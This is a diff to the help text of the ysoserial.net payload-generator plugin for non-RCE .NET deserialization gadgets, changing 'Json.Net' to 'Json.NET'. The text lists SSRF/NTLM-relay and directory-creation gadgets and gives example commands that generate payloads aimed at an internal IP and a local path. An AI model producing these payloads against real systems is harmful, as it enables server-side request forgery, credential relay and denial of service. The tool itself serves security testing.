@@ -67,22 +67,22 @@ namespace ysoserial.Plugins
 Gadgets:
 
     (*) PictureBox - SSRF / NTLM Relay gadget. Protocols that can be used: http, https, ftp, file
-        Formatters: Json.Net, JavaScriptSerializer, Xaml
+        Formatters: Json.NET, JavaScriptSerializer, Xaml
         [Finders: Piotr Bazydlo]
 
     (*) InfiniteProgressPage - SSRF / NTLM Relay gadget. Protocols that can be used: http, https, ftp, file
-        Formatters: Json.Net, JavaScriptSerializer, Xaml
+        Formatters: Json.NET, JavaScriptSerializer, Xaml
         [Finders: Piotr Bazydlo]
 
     (*) FileLogTraceListener - directory creation gadget.May lead to DoS, when executed with admin privileges.
-        Formatters: Json.Net, JavaScriptSerializer, Xaml
+        Formatters: Json.NET, JavaScriptSerializer, Xaml
         [Finders: Piotr Bazydlo]
 
 Exemplary usage: 
 
     ysoserial.exe -p NetNonRceGadgets -l
 
-    ysoserial.exe -p NetNonRceGadgets -g PictureBox -f Json.Net -i ""http://192.168.1.100/ssrf""
+    ysoserial.exe -p NetNonRceGadgets -g PictureBox -f Json.NET -i ""http://192.168.1.100/ssrf""
 
     ysoserial.exe -p NetNonRceGadgets -g FileLogTraceListener -f JavaScriptSerializer -i 'C:\\Users\\Public\\pocdir' -t
 ";
